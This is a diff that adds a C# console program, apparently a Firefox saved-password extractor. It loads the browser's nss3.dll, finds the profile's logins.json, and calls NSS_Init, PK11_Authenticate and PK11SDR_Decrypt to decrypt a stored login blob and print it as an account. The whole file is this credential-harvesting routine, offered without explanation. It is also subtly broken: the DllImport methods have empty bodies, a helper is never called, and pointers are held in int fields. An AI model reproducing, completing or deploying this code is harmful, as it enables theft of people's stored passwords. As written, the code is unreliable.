@@ -1,0 +1,135 @@
+using System;
+using System.IO;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Runtime.InteropServices;
+
+static class Module1
+{
+    public static void Main()
+    {
+        Test();
+        Console.ReadKey();
+    }
+    private static void Readdata()
+    {
+        string BasePat = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Mozilla\Firefox");
+        string Paa = Path.Combine(BasePat, "profiles.ini");
+        string LoginFile = string.Empty;
+        using (StreamReader Sr = new StreamReader(Paa))
+        {
+            LoginFile = Path.Combine(BasePat, Regex.Match(Sr.ReadToEnd(), @"Path=([^\s]+)").Groups[1].Value.Replace("/", @"\"), "logins.json");
+        }
+        if (!File.Exists(LoginFile))
+            Console.WriteLine("Datei existiert nicht!");
+    }
+
+
+
+    private static void Test()
+    {
+        NSS_Init();
+        long Keyslot = PK11_GetInternalKeySlot();
+        PK11_Authenticate(Keyslot, true, 0);
+
+        TSECItem tSecDec = new TSECItem();
+
+
+        StringBuilder se = new StringBuilder("MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECJzPAPMf8j23BAi0mf0nNAVlaQ==");
+
+        int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se, se.Length);
+        TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));
+
+        if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0 && tSecDec.SECItemLen != 0)
+        {
+            byte[] bvRet = new byte[tSecDec.SECItemLen - 1 + 1];
+            Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
+            Console.WriteLine(string.Concat("Account : ", Encoding.ASCII.GetString(bvRet)));
+        }
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct TSECItem
+    {
+        public int SECItemType, SECItemData, SECItemLen;
+    }
+    [DllImport("Kernel32.Dll")]
+    private static IntPtr LoadLibrary(string dllFilePath)
+    {
+    }
+    private static IntPtr NSS3 = IntPtr.Zero;
+    [DllImport("Kernel32.Dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+    private static IntPtr GetProcAddress(IntPtr hModule, string procName)
+    {
+    }
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    public delegate long DLLFunctionDelegate(string configdir);
+
+    public static long NSS_Init()
+    {
+        string Ppat = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Mozilla Firefox");
+        // LoadLibrary(Path.Combine(Ppat, "AccessibleMarshal.dll"))
+        // LoadLibrary(Path.Combine(Ppat, "breakpadinjector.dll"))
+        // LoadLibrary(Path.Combine(Ppat, "D3DCompiler_43.dll"))
+        // LoadLibrary(Path.Combine(Ppat, "d3dcompiler_46.dll"))
+        // LoadLibrary(Path.Combine(Ppat, "freebl3.dll"))
+        // LoadLibrary(Path.Combine(Ppat, "gkmedias.dll"))
+        // LoadLibrary(Path.Combine(Ppat, "icudt52.dll"))
+        // LoadLibrary(Path.Combine(Ppat, "icuin52.dll"))
+        // LoadLibrary(Path.Combine(Ppat, "icuuc52.dll"))
+        // LoadLibrary(Path.Combine(Ppat, "libEGL.dll"))
+        // LoadLibrary(Path.Combine(Ppat, "libGLESv2.dll"))
+        // LoadLibrary(Path.Combine(Ppat, "mozalloc.dll"))
+        LoadLibrary(Path.Combine(Ppat, "mozglue.dll"));
+        // LoadLibrary(Path.Combine(Ppat, "mozjs.dll"))
+        // LoadLibrary(Path.Combine(Ppat, "msvcp100.dll"))
+        // LoadLibrary(Path.Combine(Ppat, "msvcr100.dll"))
+        // LoadLibrary(Path.Combine(Ppat, "nssckbi.dll"))
+        // LoadLibrary(Path.Combine(Ppat, "nssdbm3.dll"))
+        // LoadLibrary(Path.Combine(Ppat, "softokn3.dll"))
+        // LoadLibrary(Path.Combine(Ppat, "xul.dll"))
+
+        NSS3 = LoadLibrary(Path.Combine(Ppat, "nss3.dll"));
+        IntPtr pProc = GetProcAddress(NSS3, "NSS_Init");
+        DLLFunctionDelegate dll = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate));
+        return dll(Ppat);
+    }
+
+
+
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    public delegate long DLLFunctionDelegate2();
+    public static long PK11_GetInternalKeySlot()
+    {
+        IntPtr pProc = GetProcAddress(NSS3, "PK11_GetInternalKeySlot");
+        DLLFunctionDelegate2 dll = (DLLFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate2));
+        return dll();
+    }
+
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);
+    public static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
+    {
+        IntPtr pProc = GetProcAddress(NSS3, "PK11_Authenticate");
+        DLLFunctionDelegate3 dll = (DLLFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate3));
+        return dll(slot, loadCerts, wincx);
+    }
+
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
+    public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
+    {
+        IntPtr pProc = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer");
+        DLLFunctionDelegate4 dll = (DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate4));
+        return dll(arenaOpt, outItemOpt, inStr, inLen);
+    }
+
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);
+    public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
+    {
+        IntPtr pProc = GetProcAddress(NSS3, "PK11SDR_Decrypt");
+        DLLFunctionDelegate5 dll = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate5));
+        return dll(ref data, ref result, cx);
+    }
+}
